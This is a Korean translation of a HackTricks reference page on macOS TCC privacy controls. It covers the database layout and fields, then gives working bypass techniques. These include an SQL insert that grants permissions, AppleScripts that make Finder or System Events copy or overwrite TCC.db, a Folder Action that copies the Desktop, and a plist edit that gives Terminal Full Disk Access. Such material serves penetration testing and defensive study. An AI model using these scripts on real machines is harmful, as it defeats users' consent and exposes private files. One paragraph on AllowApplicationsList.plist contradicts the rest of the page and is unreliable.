# macOS TCC

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>에서 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**를** **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>

## **기본 정보**

**TCC (Transparency, Consent, and Control)**는 애플리케이션 권한을 규제하는 보안 프로토콜입니다. 주요 역할은 **위치 서비스, 연락처, 사진, 마이크, 카메라, 접근성 및 전체 디스크 액세스**와 같은 민감한 기능을 보호하는 것입니다. TCC는 이러한 요소에 대한 앱 액세스를 승인하기 전에 명시적인 사용자 동의를 요구하여 개인 정보 보호와 사용자 데이터에 대한 제어를 강화합니다.

사용자는 애플리케이션이 보호된 기능에 액세스를 요청할 때 TCC와 마주칩니다. 이는 사용자가 **액세스를 승인하거나 거부**할 수 있는 프롬프트를 통해 확인할 수 있습니다. 또한 TCC는 **파일을 애플리케이션으로 끌어다 놓는** 등의 직접적인 사용자 작업을 수용하여 특정 파일에 대한 액세스를 허용하므로 애플리케이션이 명시적으로 허용된 것만 액세스할 수 있도록 합니다.

![TCC 프롬프트 예시](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC**는 `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd`에 위치한 **데몬**에 의해 처리되며, `/System/Library/LaunchDaemons/com.apple.tccd.system.plist`에서 구성됩니다(`com.apple.tccd.system` 맥 서비스를 등록함).

로그인한 사용자 당 하나의 **사용자 모드 tccd**가 `/System/Library/LaunchAgents/com.apple.tccd.plist`에 정의되어 있으며, `com.apple.tccd` 및 `com.apple.usernotifications.delegate.com.apple.tccd` 맥 서비스를 등록합니다.

여기에서 시스템 및 사용자로 실행되는 tccd를 볼 수 있습니다:
```bash
ps -ef | grep tcc
0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```
### TCC 데이터베이스

허용/거부 사항은 TCC 데이터베이스에 저장됩니다:

* 시스템 전역 데이터베이스는 **`/Library/Application Support/com.apple.TCC/TCC.db`**에 있습니다.
* 이 데이터베이스는 SIP로 보호되어 있으므로 SIP 우회만이 쓸 수 있습니다.
* 사용자 TCC 데이터베이스는 **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**에 있으며 사용자별 환경 설정을 위해 사용됩니다.
* 이 데이터베이스는 Full Disk Access와 같은 높은 TCC 권한을 가진 프로세스만 쓸 수 있습니다 (하지만 SIP로 보호되지는 않음).

{% hint style="warning" %}
이전 데이터베이스는 읽기 액세스를 위해 **TCC로 보호**됩니다. 따라서 TCC 권한이 있는 프로세스가 아닌 경우 일반 사용자 TCC 데이터베이스를 읽을 수 없습니다.

그러나 **FDA** 또는 **`kTCCServiceEndpointSecurityClient`**와 같은 이러한 높은 권한을 가진 프로세스는 사용자 TCC 데이터베이스를 쓸 수 있습니다.
{% endhint %}

* **세 번째** TCC 데이터베이스는 **`/var/db/locationd/clients.plist`**에 위치 서비스에 액세스할 수 있는 클라이언트를 나타냅니다.
* SIP로 보호된 파일 **`/Users/carlospolop/Downloads/REG.db`** (TCC로부터 읽기 액세스로 보호됨)에는 모든 유효한 TCC 데이터베이스의 위치가 포함되어 있습니다.
* SIP로 보호된 파일 **`/Users/carlospolop/Downloads/MDMOverrides.plist`** (TCC로부터 읽기 액세스로 보호됨)에는 더 많은 TCC 허용 권한이 포함되어 있습니다.
* SIP로 보호된 파일 **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`** (누구나 읽을 수 있음)은 TCC 예외가 필요한 애플리케이션의 허용 목록입니다.

{% hint style="success" %}
**iOS**의 TCC 데이터베이스는 **`/private/var/mobile/Library/TCC/TCC.db`**에 있습니다.
{% endhint %}

{% hint style="info" %}
**알림 센터 UI**는 **시스템 TCC 데이터베이스**에 변경 사항을 가할 수 있습니다:

{% code overflow="wrap" %}
```bash
codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
[..]
com.apple.private.tcc.manager
com.apple.rootless.storage.TCC
```
{% endcode %}

그러나 사용자는 **`tccutil`** 명령 줄 유틸리티를 사용하여 규칙을 **삭제하거나 조회**할 수 있습니다.
{% endhint %}

#### 데이터베이스 조회

{% tabs %}
{% tab title="사용자 DB" %}
{% code overflow="wrap" %}
```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endcode %}
{% endtab %}

{% tab title="시스템 DB" %}
{% code overflow="wrap" %}
```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endcode %}
{% endtab %}
{% endtabs %}

{% hint style="success" %}
두 데이터베이스를 모두 확인하면 앱이 허용한 권한, 금지한 권한 또는 권한을 요청하지 않은 권한을 확인할 수 있습니다.
{% endhint %}

* **`service`**는 TCC 권한의 문자열 표현입니다.
* **`client`**는 권한을 가진 번들 ID 또는 이진 파일의 경로입니다.
* **`client_type`**은 번들 식별자(0)인지 아니면 절대 경로(1)인지를 나타냅니다.

<details>

<summary>절대 경로인 경우 실행하는 방법</summary>

**`launctl load you_bin.plist`**와 같이 실행하면 됩니다. plist 파일은 다음과 같습니다:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<!-- Label for the job -->
<key>Label</key>
<string>com.example.yourbinary</string>

<!-- The path to the executable -->
<key>Program</key>
<string>/path/to/binary</string>

<!-- Arguments to pass to the executable (if any) -->
<key>ProgramArguments</key>
<array>
<string>arg1</string>
<string>arg2</string>
</array>

<!-- Run at load -->
<key>RunAtLoad</key>
<true/>

<!-- Keep the job alive, restart if necessary -->
<key>KeepAlive</key>
<true/>

<!-- Standard output and error paths (optional) -->
<key>StandardOutPath</key>
<string>/tmp/YourBinary.stdout</string>
<key>StandardErrorPath</key>
<string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```
</details>

* **`auth_value`**는 다른 값들을 가질 수 있습니다: denied(0), unknown(1), allowed(2), 또는 limited(3).
* **`auth_reason`**은 다음과 같은 값을 가질 수 있습니다: Error(1), User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8), Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12)
* **csreq** 필드는 실행할 이진 파일을 검증하고 TCC 권한을 부여하는 방법을 나타내기 위해 사용됩니다:
```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```
* **다른 필드**에 대한 자세한 정보는 [**이 블로그 포스트**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)를 확인하세요.

또한 `시스템 환경설정 --> 보안 및 개인 정보 --> 개인 정보 --> 파일 및 폴더`에서 앱에 **이미 부여된 권한**을 확인할 수 있습니다.

{% hint style="success" %}
사용자는 **`tccutil`**을 사용하여 규칙을 **삭제하거나 조회**할 수 있습니다.
{% endhint %}

#### TCC 권한 재설정
```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```
### TCC 서명 확인

TCC **데이터베이스**는 애플리케이션의 **번들 ID**를 저장하지만, 동시에 **서명에 대한 정보**도 저장하여 권한을 사용하려는 앱이 올바른 앱인지 확인합니다.

{% code overflow="wrap" %}
```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```
{% endcode %}

{% hint style="warning" %}
따라서, 동일한 이름과 번들 ID를 사용하는 다른 애플리케이션은 다른 앱에 부여된 권한에 액세스할 수 없습니다.
{% endhint %}

### 엔타이틀먼트 및 TCC 권한

앱은 **리소스에 대한 액세스를 요청**하고 **허용된 권한을 가지는 것뿐만 아니라**, **관련된 엔타이틀먼트**를 가져야 합니다.\
예를 들어, **Telegram**은 카메라에 대한 액세스를 요청하기 위해 `com.apple.security.device.camera` 엔타이틀먼트를 가지고 있습니다. 이 **엔타이틀먼트가 없는 앱은** 카메라에 액세스할 수 없으며 (사용자에게 권한을 요청하지도 않습니다).

그러나 `~/Desktop`, `~/Downloads` 및 `~/Documents`와 같은 **특정 사용자 폴더에 액세스**하기 위해서는 **특정 엔타이틀먼트가 필요하지 않습니다.** 시스템은 액세스를 투명하게 처리하고 필요할 때 **사용자에게 알림을 표시**합니다.

애플의 앱은 **알림을 생성하지 않습니다**. 그들은 **엔타이틀먼트 목록**에 **미리 부여된 권한**을 포함하고 있으므로 **팝업을 생성하지 않을 뿐만 아니라** **TCC 데이터베이스**에도 표시되지 않습니다. 예를 들어:
```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
<string>kTCCServiceReminders</string>
<string>kTCCServiceCalendar</string>
<string>kTCCServiceAddressBook</string>
</array>
```
이렇게하면 캘린더가 사용자에게 알림, 캘린더 및 주소록에 액세스하도록 요청하지 않습니다.

{% hint style="success" %}
공식 문서 외에도 [https://newosxbook.com/ent.jl](https://newosxbook.com/ent.jl)에서 권한에 대한 비공식적인 흥미로운 정보를 찾을 수 있습니다.
{% endhint %}

일부 TCC 권한은 kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos 등이 있습니다. 이들을 모두 정의하는 공개 목록은 없지만 [알려진 목록](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service)을 확인할 수 있습니다.

### 보호되지 않은 민감한 위치

* $HOME (자체)
* $HOME/.ssh, $HOME/.aws 등
* /tmp

### 사용자 의도 / com.apple.macl

이전에 언급한대로, 파일을 앱에 드래그 앤 드롭하여 앱에 대한 액세스 권한을 부여할 수 있습니다. 이 액세스는 TCC 데이터베이스에 명시되지 않지만 파일의 **확장 속성**으로 저장됩니다. 이 속성은 허용된 앱의 UUID를 저장합니다.
```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```
{% hint style="info" %}
흥미로운 점은 **Sandbox**가 아닌 **tccd**가 **`com.apple.macl`** 속성을 관리한다는 것입니다.

또한, 컴퓨터에서 앱의 UUID를 허용하는 파일을 다른 컴퓨터로 이동시키면, 동일한 앱이 다른 UID를 가지기 때문에 해당 앱에 대한 액세스 권한이 부여되지 않습니다.
{% endhint %}

확장 속성 `com.apple.macl`은 다른 확장 속성과 달리 **SIP에 의해 보호**되기 때문에 **지울 수 없습니다**. 그러나, [**이 게시물에서 설명된대로**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), 파일을 **압축**하고, **삭제**한 다음 **압축을 해제**하여 비활성화할 수 있습니다.

## TCC 권한 상승 및 우회

### TCC에 삽입

어떤 시점에서 TCC 데이터베이스에 대한 쓰기 액세스 권한을 얻게 되면 다음과 같은 방법을 사용하여 항목을 추가할 수 있습니다 (주석 제거):

<details>

<summary>TCC에 삽입 예시</summary>
```sql
INSERT INTO access (
service,
client,
client_type,
auth_value,
auth_reason,
auth_version,
csreq,
policy_id,
indirect_object_identifier_type,
indirect_object_identifier,
indirect_object_code_identity,
flags,
last_modified,
pid,
pid_version,
boot_uuid,
last_reminded
) VALUES (
'kTCCServiceSystemPolicyDesktopFolder', -- service
'com.googlecode.iterm2', -- client
0, -- client_type (0 - bundle id)
2, -- auth_value  (2 - allowed)
3, -- auth_reason (3 - "User Set")
1, -- auth_version (always 1)
X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
NULL, -- policy_id
NULL, -- indirect_object_identifier_type
'UNUSED', -- indirect_object_identifier - default value
NULL, -- indirect_object_code_identity
0, -- flags
strftime('%s', 'now'), -- last_modified with default current timestamp
NULL, -- assuming pid is an integer and optional
NULL, -- assuming pid_version is an integer and optional
'UNUSED', -- default value for boot_uuid
strftime('%s', 'now') -- last_reminded with default current timestamp
);
```
</details>

### TCC 페이로드

TCC 권한을 가진 앱에 들어갔다면 다음 페이지에서 TCC 페이로드를 악용하는 방법을 확인하세요:

{% content-ref url="macos-tcc-payloads.md" %}
[macos-tcc-payloads.md](macos-tcc-payloads.md)
{% endcontent-ref %}

### FDA\*에 대한 자동화 (Finder)

자동화 권한의 TCC 이름은 **`kTCCServiceAppleEvents`**입니다.\
이 특정 TCC 권한은 TCC 데이터베이스 내에서 **관리할 수 있는 애플리케이션을 나타냅니다** (즉, 권한은 모든 것을 관리할 수 있는 것이 아닙니다).

**Finder**는 항상 FDA 권한을 가지고 있습니다 (UI에 표시되지 않더라도), 따라서 **자동화** 권한을 가지고 있다면 그 권한을 악용하여 **일부 동작을 수행**할 수 있습니다.\
이 경우 앱은 **`com.apple.Finder`**에 대한 **`kTCCServiceAppleEvents`** 권한이 필요합니다.

{% tabs %}
{% tab title="사용자의 TCC.db 도용" %}
```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
set homeFolder to path to home folder as string
set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{% tab title="시스템 TCC.db 도용" %}
```applescript
osascript<<EOD
tell application "Finder"
set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{% endtab %}
{% endtabs %}

이를 악용하여 **사용자 TCC 데이터베이스를 직접 작성**할 수 있습니다.

{% hint style="warning" %}
이 권한을 사용하면 **Finder에게 TCC 제한 폴더에 액세스할 것을 요청**하고 파일을 제공할 수 있지만, afaik로는 Finder가 임의의 코드를 실행하지 못하므로 FDA 액세스를 완전히 악용할 수는 없습니다.

따라서 FDA의 전체 기능을 악용할 수 없습니다.
{% endhint %}

이것은 Finder에 대한 자동화 권한을 얻기 위한 TCC 프롬프트입니다:

<figure><img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" width="244"><figcaption></figcaption></figure>

{% hint style="danger" %}
**Automator** 앱이 TCC 권한 **`kTCCServiceAppleEvents`**을 가지고 있기 때문에, Finder와 같은 앱을 **제어**할 수 있습니다. 따라서 Automator를 제어할 수 있는 권한이 있다면 아래와 같은 코드로 **Finder**를 제어할 수도 있습니다:
{% endhint %}

<details>

<summary>Automator 내부에서 쉘 얻기</summary>
```applescript
osascript<<EOD
set theScript to "touch /tmp/something"

tell application "Automator"
set actionID to Automator action id "com.apple.RunShellScript"
tell (make new workflow)
add actionID to it
tell last Automator action
set value of setting "inputMethod" to 1
set value of setting "COMMAND_STRING" to theScript
end tell
execute it
end tell
activate
end tell
EOD
# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
```
</details>

**스크립트 편집기 앱**도 마찬가지로 Finder를 제어할 수 있지만, AppleScript를 사용하여 스크립트를 실행하도록 강제할 수는 없습니다.

### 자동화 (SE)를 통한 일부 TCC

**시스템 이벤트는 폴더 액션을 생성할 수 있으며, 폴더 액션은 일부 TCC 폴더에 액세스할 수 있습니다** (데스크톱, 문서 및 다운로드). 따라서 다음과 같은 스크립트를 사용하여 이 동작을 악용할 수 있습니다:
```bash
# Create script to execute with the action
cat > "/tmp/script.js" <<EOD
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("cp -r $HOME/Desktop /tmp/desktop");
EOD

osacompile -l JavaScript -o "$HOME/Library/Scripts/Folder Action Scripts/script.scpt" "/tmp/script.js"

# Create folder action with System Events in "$HOME/Desktop"
osascript <<EOD
tell application "System Events"
-- Ensure Folder Actions are enabled
set folder actions enabled to true

-- Define the path to the folder and the script
set homeFolder to path to home folder as text
set folderPath to homeFolder & "Desktop"
set scriptPath to homeFolder & "Library:Scripts:Folder Action Scripts:script.scpt"

-- Create or get the Folder Action for the Desktop
if not (exists folder action folderPath) then
make new folder action at end of folder actions with properties {name:folderPath, path:folderPath}
end if
set myFolderAction to folder action folderPath

-- Attach the script to the Folder Action
if not (exists script scriptPath of myFolderAction) then
make new script at end of scripts of myFolderAction with properties {name:scriptPath, path:scriptPath}
end if

-- Enable the Folder Action and the script
enable myFolderAction
end tell
EOD

# File operations in the folder should trigger the Folder Action
touch "$HOME/Desktop/file"
rm "$HOME/Desktop/file"
```
### 자동화 (SE) + 접근성 (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**)** to FDA\*

**`System Events`**에서의 자동화 + 접근성 (**`kTCCServicePostEvent`**)를 통해 **프로세스에 키 입력을 보낼 수 있습니다**. 이렇게 하면 Finder를 악용하여 사용자의 TCC.db를 변경하거나 임의의 앱에 FDA를 부여할 수 있습니다 (비밀번호가 요구될 수 있음).

Finder에서 사용자의 TCC.db 덮어쓰기 예시:
```applescript
-- store the TCC.db file to copy in /tmp
osascript <<EOF
tell application "System Events"
-- Open Finder
tell application "Finder" to activate

-- Open the /tmp directory
keystroke "g" using {command down, shift down}
delay 1
keystroke "/tmp"
delay 1
keystroke return
delay 1

-- Select and copy the file
keystroke "TCC.db"
delay 1
keystroke "c" using {command down}
delay 1

-- Resolve $HOME environment variable
set homePath to system attribute "HOME"

-- Navigate to the Desktop directory under $HOME
keystroke "g" using {command down, shift down}
delay 1
keystroke homePath & "/Library/Application Support/com.apple.TCC"
delay 1
keystroke return
delay 1

-- Check if the file exists in the destination and delete if it does (need to send keystorke code: https://macbiblioblog.blogspot.com/2014/12/key-codes-for-function-and-special-keys.html)
keystroke "TCC.db"
delay 1
keystroke return
delay 1
key code 51 using {command down}
delay 1

-- Paste the file
keystroke "v" using {command down}
end tell
EOF
```
### `kTCCServiceAccessibility`에서 FDA\*로

[**접근성 권한을 악용하는 페이로드**](macos-tcc-payloads.md#accessibility)를 확인하십시오. FDA\*로 권한 상승 또는 키로거 실행 등이 가능합니다.

### **Endpoint Security Client에서 FDA로**

**`kTCCServiceEndpointSecurityClient`**를 가지고 있다면, FDA를 가지고 있는 것입니다. 끝.

### 시스템 정책 SysAdmin 파일에서 FDA로

**`kTCCServiceSystemPolicySysAdminFiles`**는 사용자의 홈 폴더를 변경하는 **`NFSHomeDirectory`** 속성을 **변경**할 수 있으며, 이로 인해 TCC를 우회할 수 있습니다.

### 사용자 TCC DB에서 FDA로

사용자 TCC 데이터베이스에 대한 **쓰기 권한**을 얻으면, 자신에게 **`FDA`** 권한을 부여할 수 없습니다. 시스템 데이터베이스에 있는 권한만이 그것을 부여할 수 있습니다.

하지만 **`Finder에 대한 자동화 권한`**을 부여하고 이전 기술을 악용하여 FDA\*로 상승할 수 있습니다.

### **FDA에서 TCC 권한으로**

**전체 디스크 액세스**의 TCC 이름은 **`kTCCServiceSystemPolicyAllFiles`**입니다.

이것은 실제 권한 상승이 아닌 것 같지만, 유용할 수 있으므로 언급하겠습니다: FDA를 가진 프로그램을 제어할 수 있다면 사용자 TCC 데이터베이스를 수정하고 원하는 액세스를 부여할 수 있습니다. FDA 권한을 잃을 수도 있으므로 이는 지속성 기술로 유용할 수 있습니다.

### **SIP 우회에서 TCC 우회로**

시스템 TCC 데이터베이스는 **SIP**에 의해 보호됩니다. 따라서 **지정된 엔타이틀먼트를 가진 프로세스만이 수정**할 수 있습니다. 따라서 공격자가 SIP로 제한된 파일을 수정할 수 있는 **SIP 우회**를 찾으면 다음을 수행할 수 있습니다:

* TCC 데이터베이스의 **보호를 제거**하고 모든 TCC 권한을 부여할 수 있습니다. 예를 들어 다음 파일 중 하나를 악용할 수 있습니다:
* TCC 시스템 데이터베이스
* REG.db
* MDMOverrides.plist

그러나 이 **SIP 우회를 TCC 우회로 악용**할 수 있는 다른 옵션이 있습니다. `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` 파일은 TCC 예외를 필요로하는 애플리케이션의 허용 목록입니다. 따라서 공격자가 이 파일에서 SIP 보호를 **제거**하고 **자신의 애플리케이션**을 추가할 수 있다면 해당 애플리케이션은 TCC를 우회할 수 있습니다.\
예를 들어 터미널을 추가하는 경우:
```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```
AllowApplicationsList.plist:

AllowApplicationsList.plist 파일은 macOS의 TCC (Transparency, Consent, and Control) 프레임워크에서 사용되는 파일입니다. 이 파일은 사용자의 동의를 받은 애플리케이션 목록을 포함하고 있습니다. TCC는 macOS에서 애플리케이션들이 사용자의 데이터 및 시스템 리소스에 접근하기 위해 필요한 권한을 관리하는 보안 기능입니다.

이 파일은 /Library/Application Support/com.apple.TCC/ 디렉토리에 위치하며, 시스템 관리자 권한이 필요합니다. 이 파일을 수정하면 특정 애플리케이션이 사용자의 데이터에 접근할 수 있는지 여부를 제어할 수 있습니다.

AllowApplicationsList.plist 파일은 XML 형식으로 작성되어 있으며, 각 애플리케이션은 `<dict>` 요소로 정의됩니다. 각 애플리케이션은 `BundleID` 키를 사용하여 식별되며, `Allowed` 키를 사용하여 액세스를 허용하거나 거부할 수 있습니다.

애플리케이션을 허용하려면 `Allowed` 키를 `true`로 설정하고, 애플리케이션을 거부하려면 `Allowed` 키를 `false`로 설정합니다.

이 파일을 사용하여 macOS에서 애플리케이션의 권한을 관리할 수 있으며, 사용자의 개인 정보 보호와 시스템 보안을 강화할 수 있습니다.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Services</key>
<dict>
<key>SystemPolicyAllFiles</key>
<array>
<dict>
<key>CodeRequirement</key>
<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
<key>IdentifierType</key>
<string>bundleID</string>
<key>Identifier</key>
<string>com.apple.Terminal</string>
</dict>
</array>
</dict>
</dict>
</plist>
```
### TCC 우회

{% content-ref url="macos-tcc-bypasses/" %}
[macos-tcc-bypasses](macos-tcc-bypasses/)
{% endcontent-ref %}

## 참고 자료

* [**https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
* [**https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command**](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
* [**https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
* [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* 회사를 **HackTricks에서 광고**하거나 **PDF 형식으로 HackTricks 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 상품**](https://peass.creator-spring.com)을 구매하세요.
* 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션인 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)을 **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 기법을 공유**하세요.

</details>
